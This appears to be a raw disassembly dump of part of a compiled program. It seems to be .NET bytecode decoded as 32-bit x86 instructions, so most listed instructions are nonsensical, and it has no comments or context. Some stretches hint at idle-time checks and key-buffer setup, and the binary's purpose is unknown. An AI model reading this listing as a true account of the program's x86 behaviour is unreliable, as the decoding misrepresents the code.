  405cd5:	11 00                	adc    %eax,(%eax)
  405cd7:	70 0c                	jo     0x405ce5
  405cd9:	2b 45 11             	sub    0x11(%ebp),%eax
  405cdc:	06                   	push   %es
  405cdd:	72 c4                	jb     0x405ca3
  405cdf:	11 00                	adc    %eax,(%eax)
  405ce1:	70 16                	jo     0x405cf9
  405ce3:	28 5b 00             	sub    %bl,0x0(%ebx)
  405ce6:	00 0a                	add    %cl,(%edx)
  405ce8:	16                   	push   %ss
  405ce9:	33 08                	xor    (%eax),%ecx
  405ceb:	72 cc                	jb     0x405cb9
  405ced:	11 00                	adc    %eax,(%eax)
  405cef:	70 0c                	jo     0x405cfd
  405cf1:	2b 2d 11 06 72 d8    	sub    0xd8720611,%ebp
  405cf7:	11 00                	adc    %eax,(%eax)
  405cf9:	70 16                	jo     0x405d11
  405cfb:	28 5b 00             	sub    %bl,0x0(%ebx)
  405cfe:	00 0a                	add    %cl,(%edx)
  405d00:	16                   	push   %ss
  405d01:	33 1d 07 17 8c 38    	xor    0x388c1707,%ebx
  405d07:	00 00                	add    %al,(%eax)
  405d09:	01 16                	add    %edx,(%esi)
  405d0b:	28 d8                	sub    %bl,%al
  405d0d:	00 00                	add    %al,(%eax)
  405d0f:	0a 2c 08             	or     (%eax,%ecx,1),%ch
  405d12:	72 e8                	jb     0x405cfc
  405d14:	11 00                	adc    %eax,(%eax)
  405d16:	70 0c                	jo     0x405d24
  405d18:	2b 06                	sub    (%esi),%eax
  405d1a:	72 08                	jb     0x405d24
  405d1c:	12 00                	adc    (%eax),%al
  405d1e:	70 0c                	jo     0x405d2c
  405d20:	7e 11                	jle    0x405d33
  405d22:	00 00                	add    %al,(%eax)
  405d24:	04 17                	add    $0x17,%al
  405d26:	73 21                	jae    0x405d49
  405d28:	01 00                	add    %eax,(%eax)
  405d2a:	0a 13                	or     (%ebx),%dl
  405d2c:	05 7e 23 00 00       	add    $0x237e,%eax
  405d31:	04 28                	add    $0x28,%al
  405d33:	51                   	push   %ecx
  405d34:	00 00                	add    %al,(%eax)
  405d36:	06                   	push   %es
  405d37:	28 22                	sub    %ah,(%edx)
  405d39:	01 00                	add    %eax,(%eax)
  405d3b:	0a 2c 0f             	or     (%edi,%ecx,1),%ch
  405d3e:	11 05 08 28 11 00    	adc    %eax,0x112808
  405d44:	00 0a                	add    %cl,(%edx)
  405d46:	6f                   	outsl  %ds:(%esi),(%dx)
  405d47:	23 01                	and    (%ecx),%eax
  405d49:	00 0a                	add    %cl,(%edx)
  405d4b:	2b 34 11             	sub    (%ecx,%edx,1),%esi
  405d4e:	05 28 24 01 00       	add    $0x12428,%eax
  405d53:	0a 6f 03             	or     0x3(%edi),%ch
  405d56:	01 00                	add    %eax,(%eax)
  405d58:	0a 11                	or     (%ecx),%dl
  405d5a:	05 72 26 12 00       	add    $0x122672,%eax
  405d5f:	70 28                	jo     0x405d89
  405d61:	51                   	push   %ecx
  405d62:	00 00                	add    %al,(%eax)
  405d64:	06                   	push   %es
  405d65:	72 32                	jb     0x405d99
  405d67:	12 00                	adc    (%eax),%al
  405d69:	70 28                	jo     0x405d93
  405d6b:	28 00                	sub    %al,(%eax)
  405d6d:	00 0a                	add    %cl,(%edx)
  405d6f:	6f                   	outsl  %ds:(%esi),(%dx)
  405d70:	03 01                	add    (%ecx),%eax
  405d72:	00 0a                	add    %cl,(%edx)
  405d74:	11 05 08 28 11 00    	adc    %eax,0x112808
  405d7a:	00 0a                	add    %cl,(%edx)
  405d7c:	6f                   	outsl  %ds:(%esi),(%dx)
  405d7d:	23 01                	and    (%ecx),%eax
  405d7f:	00 0a                	add    %cl,(%edx)
  405d81:	de 0c 11             	fimuls (%ecx,%edx,1)
  405d84:	05 2c 07 11 05       	add    $0x511072c,%eax
  405d89:	6f                   	outsl  %ds:(%esi),(%dx)
  405d8a:	5e                   	pop    %esi
  405d8b:	00 00                	add    %al,(%eax)
  405d8d:	0a dc                	or     %ah,%bl
  405d8f:	7e 26                	jle    0x405db7
  405d91:	00 00                	add    %al,(%eax)
  405d93:	04 02                	add    $0x2,%al
  405d95:	03 04 28             	add    (%eax,%ebp,1),%eax
  405d98:	54                   	push   %esp
  405d99:	00 00                	add    %al,(%eax)
  405d9b:	06                   	push   %es
  405d9c:	0a 2b                	or     (%ebx),%ch
  405d9e:	00 06                	add    %al,(%esi)
  405da0:	2a 00                	sub    (%eax),%al
  405da2:	00 00                	add    %al,(%eax)
  405da4:	01 10                	add    %edx,(%eax)
  405da6:	00 00                	add    %al,(%eax)
  405da8:	02 00                	add    (%eax),%al
  405daa:	65 02 56 bb          	add    %gs:-0x45(%esi),%dl
  405dae:	02 0c 00             	add    (%eax,%eax,1),%cl
  405db1:	00 00                	add    %al,(%eax)
  405db3:	00 1b                	add    %bl,(%ebx)
  405db5:	30 07                	xor    %al,(%edi)
  405db7:	00 8b 00 00 00 34    	add    %cl,0x34000000(%ebx)
  405dbd:	00 00                	add    %al,(%eax)
  405dbf:	11 16                	adc    %edx,(%esi)
  405dc1:	0b 73 83             	or     -0x7d(%ebx),%esi
  405dc4:	00 00                	add    %al,(%eax)
  405dc6:	0a 0d 20 00 01 00    	or     0x10020,%cl
  405dcc:	00 8d 4f 00 00 01    	add    %cl,0x100004f(%ebp)
  405dd2:	13 05 11 05 74 09    	adc    0x9740511,%eax
  405dd8:	00 00                	add    %al,(%eax)
  405dda:	1b 28                	sbb    (%eax),%ebp
  405ddc:	59                   	pop    %ecx
  405ddd:	00 00                	add    %al,(%eax)
  405ddf:	06                   	push   %es
  405de0:	2d 08 72 1d 03       	sub    $0x31d7208,%eax
  405de5:	00 70 0a             	add    %dh,0xa(%eax)
  405de8:	de 5f 02             	ficomps 0x2(%edi)
  405deb:	16                   	push   %ss
  405dec:	28 5c 00 00          	sub    %bl,0x0(%eax,%eax,1)
  405df0:	06                   	push   %es
  405df1:	8c 96 00 00 01 13    	mov    %ss,0x13010000(%esi)
  405df7:	04 28                	add    $0x28,%al
  405df9:	56                   	push   %esi
  405dfa:	00 00                	add    %al,(%eax)
  405dfc:	06                   	push   %es
  405dfd:	12 01                	adc    (%ecx),%al
  405dff:	28 57 00             	sub    %dl,0x0(%edi)
  405e02:	00 06                	add    %al,(%esi)
  405e04:	28 5a 00             	sub    %bl,0x0(%edx)
  405e07:	00 06                	add    %al,(%esi)
  405e09:	0c 02                	or     $0x2,%al
  405e0b:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  405e0e:	1e                   	push   %ds
  405e0f:	01 00                	add    %eax,(%eax)
  405e11:	0a 11                	or     (%ecx),%dl
  405e13:	05 74 09 00 00       	add    $0x974,%eax
  405e18:	1b 09                	sbb    (%ecx),%ecx
  405e1a:	1b 16                	sbb    (%esi),%edx
  405e1c:	08 28                	or     %ch,(%eax)
  405e1e:	5b                   	pop    %ebx
  405e1f:	00 00                	add    %al,(%eax)
  405e21:	06                   	push   %es
  405e22:	26 09 6f 8a          	or     %ebp,%es:-0x76(%edi)
  405e26:	00 00                	add    %al,(%eax)
  405e28:	0a 0a                	or     (%edx),%cl
  405e2a:	de 1d de 0c 28 25    	ficomps 0x25280cde
  405e30:	00 00                	add    %al,(%eax)
  405e32:	0a 28                	or     (%eax),%ch
  405e34:	27                   	daa
  405e35:	00 00                	add    %al,(%eax)
  405e37:	0a de                	or     %dh,%bl
  405e39:	00 02                	add    %al,(%edx)
  405e3b:	84 8c 95 00 00 01 6f 	test   %cl,0x6f010000(%ebp,%edx,4)
  405e42:	20 01                	and    %al,(%ecx)
  405e44:	00 0a                	add    %cl,(%edx)
  405e46:	0a 2b                	or     (%ebx),%ch
  405e48:	00 06                	add    %al,(%esi)
  405e4a:	2a 00                	sub    (%eax),%al
  405e4c:	01 10                	add    %edx,(%eax)
  405e4e:	00 00                	add    %al,(%eax)
  405e50:	00 00                	add    %al,(%eax)
  405e52:	02 00                	add    (%eax),%al
  405e54:	6c                   	insb   (%dx),%es:(%edi)
  405e55:	6e                   	outsb  %ds:(%esi),(%dx)
  405e56:	00 0c 29             	add    %cl,(%ecx,%ebp,1)
  405e59:	00 00                	add    %al,(%eax)
  405e5b:	01 1b                	add    %ebx,(%ebx)
  405e5d:	30 07                	xor    %al,(%edi)
  405e5f:	00 95 00 00 00 35    	add    %dl,0x35000000(%ebp)
  405e65:	00 00                	add    %al,(%eax)
  405e67:	11 16                	adc    %edx,(%esi)
  405e69:	0b 28                	or     (%eax),%ebp
  405e6b:	56                   	push   %esi
  405e6c:	00 00                	add    %al,(%eax)
  405e6e:	06                   	push   %es
  405e6f:	0c 08                	or     $0x8,%al
  405e71:	12 01                	adc    (%ecx),%al
  405e73:	28 57 00             	sub    %dl,0x0(%edi)
  405e76:	00 06                	add    %al,(%esi)
  405e78:	26 07                	es pop %es
  405e7a:	84 28                	test   %ch,(%eax)
  405e7c:	25 01 00 0a 0d       	and    $0xd0a0001,%eax
  405e81:	09 14 72             	or     %edx,(%edx,%esi,2)
  405e84:	3c 12                	cmp    $0x12,%al
  405e86:	00 70 16             	add    %dh,0x16(%eax)
  405e89:	8d 03                	lea    (%ebx),%eax
  405e8b:	00 00                	add    %al,(%eax)
  405e8d:	01 14 14             	add    %edx,(%esp,%edx,1)
  405e90:	14 28                	adc    $0x28,%al
  405e92:	41                   	inc    %ecx
  405e93:	00 00                	add    %al,(%eax)
  405e95:	0a 28                	or     (%eax),%ch
  405e97:	11 00                	adc    %eax,(%eax)
  405e99:	00 0a                	add    %cl,(%edx)
  405e9b:	13 04 11             	adc    (%ecx,%edx,1),%eax
  405e9e:	04 28                	add    $0x28,%al
  405ea0:	23 00                	and    (%eax),%eax
  405ea2:	00 0a                	add    %cl,(%edx)
  405ea4:	28 26                	sub    %ah,(%esi)
  405ea6:	01 00                	add    %eax,(%eax)
  405ea8:	0a 2c 1c             	or     (%esp,%ebx,1),%ch
  405eab:	09 14 72             	or     %edx,(%edx,%esi,2)
  405eae:	5c                   	pop    %esp
  405eaf:	12 00                	adc    (%eax),%al
  405eb1:	70 16                	jo     0x405ec9
  405eb3:	8d 03                	lea    (%ebx),%eax
  405eb5:	00 00                	add    %al,(%eax)
  405eb7:	01 14 14             	add    %edx,(%esp,%edx,1)
  405eba:	14 28                	adc    $0x28,%al
  405ebc:	41                   	inc    %ecx
  405ebd:	00 00                	add    %al,(%eax)
  405ebf:	0a 28                	or     (%eax),%ch
  405ec1:	11 00                	adc    %eax,(%eax)
  405ec3:	00 0a                	add    %cl,(%edx)
  405ec5:	13 04 11             	adc    (%ecx,%edx,1),%eax
  405ec8:	04 28                	add    $0x28,%al
  405eca:	23 00                	and    (%eax),%eax
  405ecc:	00 0a                	add    %cl,(%edx)
  405ece:	80 23 00             	andb   $0x0,(%ebx)
  405ed1:	00 04 11             	add    %al,(%ecx,%edx,1)
  405ed4:	04 28                	add    $0x28,%al
  405ed6:	23 00                	and    (%eax),%eax
  405ed8:	00 0a                	add    %cl,(%edx)
  405eda:	0a de                	or     %dh,%bl
  405edc:	1e                   	push   %ds
  405edd:	de 1c 25 28 25 00 00 	ficomps 0x2528(,%eiz,1)
  405ee4:	0a 13                	or     (%ebx),%dl
  405ee6:	05 72 74 12 00       	add    $0x127472,%eax
  405eeb:	70 0a                	jo     0x405ef7
  405eed:	28 27                	sub    %ah,(%edi)
  405eef:	00 00                	add    %al,(%eax)
  405ef1:	0a de                	or     %dh,%bl
  405ef3:	07                   	pop    %es
  405ef4:	28 27                	sub    %ah,(%edi)
  405ef6:	00 00                	add    %al,(%eax)
  405ef8:	0a de                	or     %dh,%bl
  405efa:	00 06                	add    %al,(%esi)
  405efc:	2a 00                	sub    (%eax),%al
  405efe:	00 00                	add    %al,(%eax)
  405f00:	01 10                	add    %edx,(%eax)
  405f02:	00 00                	add    %al,(%eax)
  405f04:	00 00                	add    %al,(%eax)
  405f06:	02 00                	add    (%eax),%al
  405f08:	75 77                	jne    0x405f81
  405f0a:	00 1c 29             	add    %bl,(%ecx,%ebp,1)
  405f0d:	00 00                	add    %al,(%eax)
  405f0f:	01 1e                	add    %ebx,(%esi)
  405f11:	02 28                	add    (%eax),%ch
  405f13:	17                   	pop    %ss
  405f14:	00 00                	add    %al,(%eax)
  405f16:	0a 2a                	or     (%edx),%ch
  405f18:	1a 28                	sbb    (%eax),%ch
  405f1a:	61                   	popa
  405f1b:	00 00                	add    %al,(%eax)
  405f1d:	06                   	push   %es
  405f1e:	2a 00                	sub    (%eax),%al
  405f20:	1b 30                	sbb    (%eax),%esi
  405f22:	03 00                	add    (%eax),%eax
  405f24:	30 00                	xor    %al,(%eax)
  405f26:	00 00                	add    %al,(%eax)
  405f28:	36 00 00             	add    %al,%ss:(%eax)
  405f2b:	11 14 fe             	adc    %edx,(%esi,%edi,8)
  405f2e:	06                   	push   %es
  405f2f:	5f                   	pop    %edi
  405f30:	00 00                	add    %al,(%eax)
  405f32:	06                   	push   %es
  405f33:	73 28                	jae    0x405f5d
  405f35:	01 00                	add    %eax,(%eax)
  405f37:	0a 28                	or     (%eax),%ch
  405f39:	29 01                	sub    %eax,(%ecx)
  405f3b:	00 0a                	add    %cl,(%edx)
  405f3d:	28 2a                	sub    %ch,(%edx)
  405f3f:	01 00                	add    %eax,(%eax)
  405f41:	0a 17                	or     (%edi),%dl
  405f43:	12 00                	adc    (%eax),%al
  405f45:	16                   	push   %ss
  405f46:	28 5e 00             	sub    %bl,0x0(%esi)
  405f49:	00 06                	add    %al,(%esi)
  405f4b:	de 0e                	fimuls (%esi)
  405f4d:	25 28 25 00 00       	and    $0x2528,%eax
  405f52:	0a 0b                	or     (%ebx),%cl
  405f54:	28 27                	sub    %ah,(%edi)
  405f56:	00 00                	add    %al,(%eax)
  405f58:	0a de                	or     %dh,%bl
  405f5a:	00 2a                	add    %ch,(%edx)
  405f5c:	01 10                	add    %edx,(%eax)
  405f5e:	00 00                	add    %al,(%eax)
  405f60:	00 00                	add    %al,(%eax)
  405f62:	00 00                	add    %al,(%eax)
  405f64:	21 21                	and    %esp,(%ecx)
  405f66:	00 0e                	add    %cl,(%esi)
  405f68:	29 00                	sub    %eax,(%eax)
  405f6a:	00 01                	add    %al,(%ecx)
  405f6c:	1b 30                	sbb    (%eax),%esi
  405f6e:	03 00                	add    (%eax),%eax
  405f70:	1a 00                	sbb    (%eax),%al
  405f72:	00 00                	add    %al,(%eax)
  405f74:	37                   	aaa
  405f75:	00 00                	add    %al,(%eax)
  405f77:	11 16                	adc    %edx,(%esi)
  405f79:	12 00                	adc    (%eax),%al
  405f7b:	16                   	push   %ss
  405f7c:	28 5e 00             	sub    %bl,0x0(%esi)
  405f7f:	00 06                	add    %al,(%esi)
  405f81:	de 0e                	fimuls (%esi)
  405f83:	25 28 25 00 00       	and    $0x2528,%eax
  405f88:	0a 0b                	or     (%ebx),%cl
  405f8a:	28 27                	sub    %ah,(%edi)
  405f8c:	00 00                	add    %al,(%eax)
  405f8e:	0a de                	or     %dh,%bl
  405f90:	00 2a                	add    %ch,(%edx)
  405f92:	00 00                	add    %al,(%eax)
  405f94:	01 10                	add    %edx,(%eax)
  405f96:	00 00                	add    %al,(%eax)
  405f98:	00 00                	add    %al,(%eax)
  405f9a:	00 00                	add    %al,(%eax)
  405f9c:	0b 0b                	or     (%ebx),%ecx
  405f9e:	00 0e                	add    %cl,(%esi)
  405fa0:	29 00                	sub    %eax,(%eax)
  405fa2:	00 01                	add    %al,(%ecx)
  405fa4:	1e                   	push   %ds
  405fa5:	02 28                	add    (%eax),%ch
  405fa7:	17                   	pop    %ss
  405fa8:	00 00                	add    %al,(%eax)
  405faa:	0a 2a                	or     (%edx),%ch
  405fac:	13 30                	adc    (%eax),%esi
  405fae:	05 00 80 00 00       	add    $0x8000,%eax
  405fb3:	00 38                	add    %bh,(%eax)
  405fb5:	00 00                	add    %al,(%eax)
  405fb7:	11 73 2b             	adc    %esi,0x2b(%ebx)
  405fba:	01 00                	add    %eax,(%eax)
  405fbc:	0a 0a                	or     (%edx),%cl
  405fbe:	73 2c                	jae    0x405fec
  405fc0:	01 00                	add    %eax,(%eax)
  405fc2:	0a 13                	or     (%ebx),%dl
  405fc4:	06                   	push   %es
  405fc5:	72 1d                	jb     0x405fe4
  405fc7:	03 00                	add    (%eax),%eax
  405fc9:	70 0d                	jo     0x405fd8
  405fcb:	1f                   	pop    %ds
  405fcc:	20 8d 4f 00 00 01    	and    %cl,0x100004f(%ebp)
  405fd2:	13 05 11 06 7e 10    	adc    0x107e0611,%eax
  405fd8:	00 00                	add    %al,(%eax)
  405fda:	04 28                	add    $0x28,%al
  405fdc:	70 00                	jo     0x405fde
  405fde:	00 06                	add    %al,(%esi)
  405fe0:	6f                   	outsl  %ds:(%esi),(%dx)
  405fe1:	2d 01 00 0a 13       	sub    $0x130a0001,%eax
  405fe6:	07                   	pop    %es
  405fe7:	11 07                	adc    %eax,(%edi)
  405fe9:	16                   	push   %ss
  405fea:	11 05 16 1f 10 28    	adc    %eax,0x28101f16
  405ff0:	2e 01 00             	add    %eax,%cs:(%eax)
  405ff3:	0a 11                	or     (%ecx),%dl
  405ff5:	07                   	pop    %es
  405ff6:	16                   	push   %ss
  405ff7:	11 05 1f 0f 1f 10    	adc    %eax,0x101f0f1f
  405ffd:	28 2e                	sub    %ch,(%esi)
  405fff:	01 00                	add    %eax,(%eax)
  406001:	0a 06                	or     (%esi),%al
  406003:	11 05 6f 2f 01 00    	adc    %eax,0x12f6f
  406009:	0a 06                	or     (%esi),%al
  40600b:	18 6f 30             	sbb    %ch,0x30(%edi)
  40600e:	01 00                	add    %eax,(%eax)
  406010:	0a 06                	or     (%esi),%al
  406012:	6f                   	outsl  %ds:(%esi),(%dx)
  406013:	31 01                	xor    %eax,(%ecx)
  406015:	00 0a                	add    %cl,(%edx)
  406017:	13 04 02             	adc    (%edx,%eax,1),%eax
  40601a:	28 b2 00 00 0a 0b    	sub    %dh,0xb0a0000(%edx)
  406020:	11 04 07             	adc    %eax,(%edi,%eax,1)
  406023:	16                   	push   %ss
  406024:	07                   	pop    %es
  406025:	8e b7 6f 32 01 00    	mov    0x1326f(%edi),%?
  40602b:	0a 28                	or     (%eax),%ch
  40602d:	71 00                	jno    0x40602f
  40602f:	00 06                	add    %al,(%esi)
  406031:	0d 09 0c 2b 00       	or     $0x2b0c09,%eax
  406036:	08 2a                	or     %ch,(%edx)
  406038:	13 30                	adc    (%eax),%esi
  40603a:	03 00                	add    (%eax),%eax
  40603c:	75 00                	jne    0x40603e
  40603e:	00 00                	add    %al,(%eax)
  406040:	39 00                	cmp    %eax,(%eax)
  406042:	00 11                	add    %dl,(%ecx)
  406044:	16                   	push   %ss
  406045:	80 28 00             	subb   $0x0,(%eax)
  406048:	00 04 73             	add    %al,(%ebx,%esi,2)
  40604b:	61                   	popa
  40604c:	00 00                	add    %al,(%eax)
  40604e:	0a 80 2b 00 00 04    	or     0x400002b(%eax),%al
  406054:	72 7c                	jb     0x4060d2
  406056:	12 00                	adc    (%eax),%al
  406058:	70 28                	jo     0x406082
  40605a:	72 00                	jb     0x40605c
  40605c:	00 06                	add    %al,(%esi)
  40605e:	28 1f                	sub    %bl,(%edi)
  406060:	00 00                	add    %al,(%eax)
  406062:	0a 80 2c 00 00 04    	or     0x400002c(%eax),%al
  406068:	28 4c 00 00          	sub    %cl,0x0(%eax,%eax,1)
  40606c:	0a 6f 4d             	or     0x4d(%edi),%ch
  40606f:	00 00                	add    %al,(%eax)
  406071:	0a 6f 33             	or     0x33(%edi),%ch
  406074:	01 00                	add    %eax,(%eax)
  406076:	0a 80 2d 00 00 04    	or     0x400002d(%eax),%al
  40607c:	7f 2f                	jg     0x4060ad
  40607e:	00 00                	add    %al,(%eax)
  406080:	04 fe                	add    $0xfe,%al
  406082:	15 12 00 00 02       	adc    $0x2000012,%eax
  406087:	7f 30                	jg     0x4060b9
  406089:	00 00                	add    %al,(%eax)
  40608b:	04 16                	add    $0x16,%al
  40608d:	6a 28                	push   $0x28
  40608f:	34 01                	xor    $0x1,%al
  406091:	00 0a                	add    %cl,(%edx)
  406093:	19 8d 26 00 00 01    	sbb    %ecx,0x1000026(%ebp)
  406099:	0a 06                	or     (%esi),%al
  40609b:	16                   	push   %ss
  40609c:	72 90                	jb     0x40602e
  40609e:	12 00                	adc    (%eax),%al
  4060a0:	70 a2                	jo     0x406044
  4060a2:	06                   	push   %es
  4060a3:	17                   	pop    %ss
  4060a4:	72 2d                	jb     0x4060d3
  4060a6:	13 00                	adc    (%eax),%eax
  4060a8:	70 a2                	jo     0x40604c
  4060aa:	06                   	push   %es
  4060ab:	18 72 42             	sbb    %dh,0x42(%edx)
  4060ae:	14 00                	adc    $0x0,%al
  4060b0:	70 a2                	jo     0x406054
  4060b2:	06                   	push   %es
  4060b3:	80 33 00             	xorb   $0x0,(%ebx)
  4060b6:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4060b9:	00 00                	add    %al,(%eax)
  4060bb:	00 13                	add    %dl,(%ebx)
  4060bd:	30 02                	xor    %al,(%edx)
  4060bf:	00 11                	add    %dl,(%ecx)
  4060c1:	00 00                	add    %al,(%eax)
  4060c3:	00 3a                	add    %bh,(%edx)
  4060c5:	00 00                	add    %al,(%eax)
  4060c7:	11 02                	adc    %eax,(%edx)
  4060c9:	28 35 01 00 0a 16    	sub    %dh,0x160a0001
  4060cf:	fe 01                	incb   (%ecx)
  4060d1:	16                   	push   %ss
  4060d2:	fe 01                	incb   (%ecx)
  4060d4:	0a 2b                	or     (%ebx),%ch
  4060d6:	00 06                	add    %al,(%esi)
  4060d8:	2a 00                	sub    (%eax),%al
  4060da:	00 00                	add    %al,(%eax)
  4060dc:	13 30                	adc    (%eax),%esi
  4060de:	04 00                	add    $0x0,%al
  4060e0:	47                   	inc    %edi
  4060e1:	00 00                	add    %al,(%eax)
  4060e3:	00 3b                	add    %bh,(%ebx)
  4060e5:	00 00                	add    %al,(%eax)
  4060e7:	11 02                	adc    %eax,(%edx)
  4060e9:	73 36                	jae    0x406121
  4060eb:	01 00                	add    %eax,(%eax)
  4060ed:	0a 0b                	or     (%ebx),%cl
  4060ef:	16                   	push   %ss
  4060f0:	02 17                	add    (%edi),%dl
  4060f2:	da 0d 0c 2b 29 07    	fimull 0x7292b0c
  4060f8:	72 2b                	jb     0x406125
  4060fa:	15 00 70 7e 2b       	adc    $0x2b7e7000,%eax
  4060ff:	00 00                	add    %al,(%eax)
  406101:	04 72                	add    $0x72,%al
  406103:	2b 15 00 70 6f 8b    	sub    0x8b6f7000,%edx
  406109:	00 00                	add    %al,(%eax)
  40610b:	0a 6f 68             	or     0x68(%edi),%ch
  40610e:	00 00                	add    %al,(%eax)
  406110:	0a 6f 37             	or     0x37(%edi),%ch
  406113:	01 00                	add    %eax,(%eax)
  406115:	0a 6f 38             	or     0x38(%edi),%ch
  406118:	01 00                	add    %eax,(%eax)
  40611a:	0a 26                	or     (%esi),%ah
  40611c:	08 17                	or     %dl,(%edi)
  40611e:	d6                   	salc
  40611f:	0c 08                	or     $0x8,%al
  406121:	09 31                	or     %esi,(%ecx)
  406123:	d3 07                	roll   %cl,(%edi)
  406125:	6f                   	outsl  %ds:(%esi),(%dx)
  406126:	8a 00                	mov    (%eax),%al
  406128:	00 0a                	add    %cl,(%edx)
  40612a:	0a 2b                	or     (%ebx),%ch
  40612c:	00 06                	add    %al,(%esi)
  40612e:	2a 00                	sub    (%eax),%al
  406130:	13 30                	adc    (%eax),%esi
  406132:	02 00                	add    (%eax),%al
  406134:	6f                   	outsl  %ds:(%esi),(%dx)
  406135:	00 00                	add    %al,(%eax)
  406137:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40613a:	00 11                	add    %dl,(%ecx)
  40613c:	16                   	push   %ss
  40613d:	80 2e 00             	subb   $0x0,(%esi)
  406140:	00 04 7f             	add    %al,(%edi,%edi,2)
  406143:	2f                   	das
  406144:	00 00                	add    %al,(%eax)
  406146:	04 7e                	add    $0x7e,%al
  406148:	2f                   	das
  406149:	00 00                	add    %al,(%eax)
  40614b:	04 28                	add    $0x28,%al
  40614d:	04 00                	add    $0x0,%al
  40614f:	00 2b                	add    %ch,(%ebx)
  406151:	7d 35                	jge    0x406188
  406153:	00 00                	add    %al,(%eax)
  406155:	04 7f                	add    $0x7f,%al
  406157:	2f                   	das
  406158:	00 00                	add    %al,(%eax)
  40615a:	04 16                	add    $0x16,%al
  40615c:	7d 36                	jge    0x406194
  40615e:	00 00                	add    %al,(%eax)
  406160:	04 7f                	add    $0x7f,%al
  406162:	2f                   	das
  406163:	00 00                	add    %al,(%eax)
  406165:	04 28                	add    $0x28,%al
  406167:	68 00 00 06 2c       	push   $0x2c060000
  40616c:	15 28 3a 01 00       	adc    $0x13a28,%eax
  406171:	0a 7f 2f             	or     0x2f(%edi),%bh
  406174:	00 00                	add    %al,(%eax)
  406176:	04 7b                	add    $0x7b,%al
  406178:	36 00 00             	add    %al,%ss:(%eax)
  40617b:	04 da                	add    $0xda,%al
  40617d:	80 2e 00             	subb   $0x0,(%esi)
  406180:	00 04 7e             	add    %al,(%esi,%edi,2)
  406183:	2e 00 00             	add    %al,%cs:(%eax)
  406186:	04 16                	add    $0x16,%al
  406188:	31 1b                	xor    %ebx,(%ebx)
  40618a:	7e 2e                	jle    0x4061ba
  40618c:	00 00                	add    %al,(%eax)
  40618e:	04 6c                	add    $0x6c,%al
  406190:	23 00                	and    (%eax),%eax
  406192:	00 00                	add    %al,(%eax)
  406194:	00 00                	add    %al,(%eax)
  406196:	40                   	inc    %eax
  406197:	8f 40 5b             	pop    0x5b(%eax)
  40619a:	28 97 00 00 0a b7    	sub    %dl,-0x48f60000(%edi)
  4061a0:	0a 2b                	or     (%ebx),%ch
  4061a2:	06                   	push   %es
  4061a3:	2b 04 16             	sub    (%esi,%edx,1),%eax
  4061a6:	0a 2b                	or     (%ebx),%ch
  4061a8:	00 06                	add    %al,(%esi)
  4061aa:	2a 00                	sub    (%eax),%al
  4061ac:	13 30                	adc    (%eax),%esi
  4061ae:	02 00                	add    (%eax),%al
  4061b0:	50                   	push   %eax
  4061b1:	00 00                	add    %al,(%eax)
  4061b3:	00 3d 00 00 11 2b    	add    %bh,0x2b110000
  4061b9:	49                   	dec    %ecx
  4061ba:	20 e8                	and    %ch,%al
  4061bc:	03 00                	add    (%eax),%eax
  4061be:	00 28                	add    %ch,(%eax)
  4061c0:	22 00                	and    (%eax),%al
  4061c2:	00 0a                	add    %cl,(%edx)
  4061c4:	28 69 00             	sub    %ch,0x0(%ecx)
  4061c7:	00 06                	add    %al,(%esi)
  4061c9:	0b 7e 31             	or     0x31(%esi),%edi
  4061cc:	00 00                	add    %al,(%eax)
  4061ce:	04 07                	add    $0x7,%al
  4061d0:	31 1c 7f             	xor    %ebx,(%edi,%edi,2)
  4061d3:	30 00                	xor    %al,(%eax)
  4061d5:	00 04 7e             	add    %al,(%esi,%edi,2)
  4061d8:	31 00                	xor    %eax,(%eax)
  4061da:	00 04 6c             	add    %al,(%esp,%ebp,2)
  4061dd:	28 dc                	sub    %bl,%ah
  4061df:	00 00                	add    %al,(%eax)
  4061e1:	0a 28                	or     (%eax),%ch
  4061e3:	3b 01                	cmp    (%ecx),%eax
  4061e5:	00 0a                	add    %cl,(%edx)
  4061e7:	80 30 00             	xorb   $0x0,(%eax)
  4061ea:	00 04 2b             	add    %al,(%ebx,%ebp,1)
  4061ed:	0f 28 69 00          	movaps 0x0(%ecx),%xmm5
  4061f1:	00 06                	add    %al,(%esi)
  4061f3:	28 a5 00 00 0a 80    	sub    %ah,-0x7ff60000(%ebp)
  4061f9:	32 00                	xor    (%eax),%al
  4061fb:	00 04 07             	add    %al,(%edi,%eax,1)
  4061fe:	80 31 00             	xorb   $0x0,(%ecx)
  406201:	00 04 17             	add    %al,(%edi,%edx,1)
  406204:	2d b4 06 2a 1b       	sub    $0x1b2a06b4,%eax
  406209:	30 01                	xor    %al,(%ecx)
  40620b:	00 1a                	add    %bl,(%edx)
  40620d:	00 00                	add    %al,(%eax)
  40620f:	00 00                	add    %al,(%eax)
  406211:	00 00                	add    %al,(%eax)
  406213:	00 20                	add    %ah,(%eax)
  406215:	03 00                	add    (%eax),%eax
  406217:	00 80 28 6d 00 00    	add    %al,0x6d28(%eax)
  40621d:	06                   	push   %es
  40621e:	26 de 0c 28          	fimuls %es:(%eax,%ebp,1)
  406222:	25 00 00 0a 28       	and    $0x280a0000,%eax
  406227:	27                   	daa
  406228:	00 00                	add    %al,(%eax)
  40622a:	0a de                	or     %dh,%bl
  40622c:	00 2a                	add    %ch,(%edx)
  40622e:	00 00                	add    %al,(%eax)
  406230:	01 10                	add    %edx,(%eax)
  406232:	00 00                	add    %al,(%eax)
  406234:	00 00                	add    %al,(%eax)
  406236:	00 00                	add    %al,(%eax)
  406238:	0d 0d 00 0c 29       	or     $0x290c000d,%eax
  40623d:	00 00                	add    %al,(%eax)
  40623f:	01 1b                	add    %ebx,(%ebx)
  406241:	30 03                	xor    %al,(%ebx)
  406243:	00 41 00             	add    %al,0x0(%ecx)
  406246:	00 00                	add    %al,(%eax)
  406248:	3f                   	aas
  406249:	00 00                	add    %al,(%eax)
  40624b:	11 20                	adc    %esp,(%eax)
  40624d:	00 01                	add    %al,(%ecx)
  40624f:	00 00                	add    %al,(%eax)
  406251:	73 36                	jae    0x406289
  406253:	01 00                	add    %eax,(%eax)
  406255:	0a 0b                	or     (%ebx),%cl
  406257:	28 6b 00             	sub    %ch,0x0(%ebx)
  40625a:	00 06                	add    %al,(%esi)
  40625c:	0c 08                	or     $0x8,%al
  40625e:	07                   	pop    %es
  40625f:	20 00                	and    %al,(%eax)
  406261:	01 00                	add    %eax,(%eax)
  406263:	00 28                	add    %ch,(%eax)
  406265:	6c                   	insb   (%dx),%es:(%edi)
